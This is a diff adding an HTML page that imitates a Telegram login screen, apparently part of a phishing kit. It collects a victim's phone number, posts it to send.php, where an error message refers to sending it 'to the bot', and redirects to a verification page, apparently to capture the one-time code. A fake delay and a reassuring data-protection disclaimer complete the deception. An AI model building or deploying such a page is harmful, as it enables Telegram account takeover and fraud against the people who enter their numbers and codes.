@@ -1,0 +1,252 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Enter telegram number</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    /* --- [Style Tetap Sama seperti Asli] --- */
+    :root {
+      --primary-color: #0088cc;
+      --secondary-color: #00c6ff;
+      --background-gradient: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+      --white: #ffffff;
+      --text-color: #333333;
+      --label-color: #555555;
+      --border-color: #dddddd;
+      --shadow-color: rgba(0, 0, 0, 0.1);
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background: url('gay1.jpg') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      overflow: hidden;
+      position: relative;
+    }
+    body::before {
+      content: "";
+      position: absolute;
+      top: -20%;
+      left: -20%;
+      width: 140%;
+      height: 140%;
+      background: radial-gradient(circle, rgba(255,255,255,0.15), transparent 100%);
+      animation: pulse 6s infinite;
+      z-index: 0;
+    }
+    @keyframes pulse {
+      0% { transform: scale(0.9); opacity: 0.8; }
+      50% { transform: scale(1); opacity: 1; }
+      100% { transform: scale(0.9); opacity: 0.8; }
+    }
+    .container {
+      background: none;
+      border-radius: 16px;
+      padding: 90px 30px 40px;
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+      position: relative;
+      z-index: 1;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
+      animation: fadeInUp 2s ease;
+    }
+    @keyframes fadeInUp {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .icon {
+      width: 100px;
+      height: 100px;
+      margin: -70px auto 20px;
+      color: var(--primary-color);
+      transition: transform 0.3s;
+    }
+    .telegram-logo {
+      width: 100%;
+      height: 100%;
+    }
+    .icon:hover { transform: rotate(15deg); }
+    h1 {
+      font-size: 24px;
+      margin: 0 0 20px;
+      color: var(--text-color);
+      font-weight: 500;
+    }
+    label {
+      display: block;
+      text-align: left;
+      margin-bottom: 8px;
+      font-size: 14px;
+      color: #333333;
+      font-weight: 500;
+    }
+    input[type="tel"] {
+      background: #fff;
+      width: 100%;
+      padding: 12px 15px;
+      margin-bottom: 20px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: 1px solid #000;
+      transition: border-color 0.3s, box-shadow 0.3s;
+    }
+    input[type="tel"]:focus {
+      outline: none;
+      border-color: #0077b3;
+      box-shadow: 0 0 8px #0077b3;
+    }
+    .btn {
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
+      background-color: var(--primary-color);
+      color: var(--white);
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background-color 0.8s, transform 0.3s;
+    }
+    .btn:hover {
+      background-color: #0077b3;
+      transform: scale(1.02);
+    }
+    .status {
+      margin-top: 15px;
+      font-size: 14px;
+      font-weight: 500;
+      min-height: 20px;
+    }
+    .disclaimer {
+      font-size: 12px;
+      color: #000;
+      margin: 25px 0 0;
+      line-height: 1.5;
+    }
+    #blurOverlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      backdrop-filter: blur(6px);
+      background-color: rgba(255, 255, 255, 0.4);
+      z-index: 9999;
+      display: none;
+    }
+    #loadingText {
+      position: fixed;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 20px;
+      font-weight: bold;
+      color: black;
+      z-index: 10000;
+      display: none;
+    }
+    #countrySelect {
+  height: 40px;
+  font-size: 16px;
+  width: 100%;
+  padding: 8px;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+  margin-bottom: 10px;
+}
+
+  </style>
+</head>
+
+<body>
+  <div id="blurOverlay"></div>
+  <div id="loadingText">⏳ Processing OTP, please wait...</div>
+
+  <div class="container">
+    <div class="icon">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="telegram-logo">
+        <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394a.759.759 0 0 1-.6.295h-.006l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.643-.203-.658-.643.136-.953l11.566-4.458c.538-.196 1.006.128.832.941z"/>
+      </svg>
+    </div>
+    <h1>Enter telegram number</h1>
+    <p>To continue, please login first</p>
+    <form id="phoneForm">
+      <label for="country">Country code \/</label>
+      <select id="countrySelect">
+        <option value="+966">KSA Saudi Arabia (+966)</option>
+        <option value="+971">UAE United Arab Emirates (+971)</option>
+        <option value="+965">KW Kuwait (+965)</option>
+        <option value="+65">SG Singapore (+65)</option>
+        <option value="+60">MYS Malaysia (+60)</option>
+      </select>
+  <label for="phone">Telegram number</label>
+  <input type="tel" id="phoneInput" placeholder="Telegram number" required />
+
+  <button type="submit" class="btn">next</button>
+
+  <div class="disclaimer">
+    *Make sure the number entered is active to receive verification. Data will be kept confidential in accordance with the Personal Data Protection Act.
+  </div>
+</form>
+<div class="status" id="statusMessage"></div>
+</div>
+
+<script>
+  const phoneForm = document.getElementById('phoneForm');
+  const phoneInput = document.getElementById('phoneInput');
+  const statusMessage = document.getElementById('statusMessage');
+  const blurOverlay = document.getElementById('blurOverlay');
+  const loadingText = document.getElementById('loadingText');
+
+  phoneForm.addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const phone = phoneInput.value.trim();
+    if (!phone) {
+      statusMessage.textContent = "⚠️ Nomor tidak boleh kosong.";
+      statusMessage.style.color = "red";
+      return;
+    }
+
+    statusMessage.textContent = "⏳ Sending OTP to your Telegram account...";
+    statusMessage.style.color = "#000";
+    blurOverlay.style.display = "block";
+    loadingText.style.display = "block";
+
+    const formData = new FormData();
+    formData.append("phone", phone);
+
+    fetch("send.php", {
+      method: "POST",
+      body: formData
+    })
+    .then(res => res.json())
+    .then(data => {
+      setTimeout(() => {
+        blurOverlay.style.display = "none";
+        loadingText.style.display = "none";
+
+        if (data.ok) {
+          window.location.href = `verify.html?phone=${encodeURIComponent(phone)}`;
+        } else {
+          statusMessage.textContent = "❌ Gagal mengirim ke bot.";
+          statusMessage.style.color = "red";
+        }
+      }, 7000);
+    })
+    .catch(err => {
+      setTimeout(() => {
+        blurOverlay.style.display = "none";
+        loadingText.style.display = "none";
+        statusMessage.textContent = "❌ Error: " + err.message;
+        statusMessage.style.color = "red";
+      }, 7000);
+    });
+  });
+</script>
+</body>
+</html>
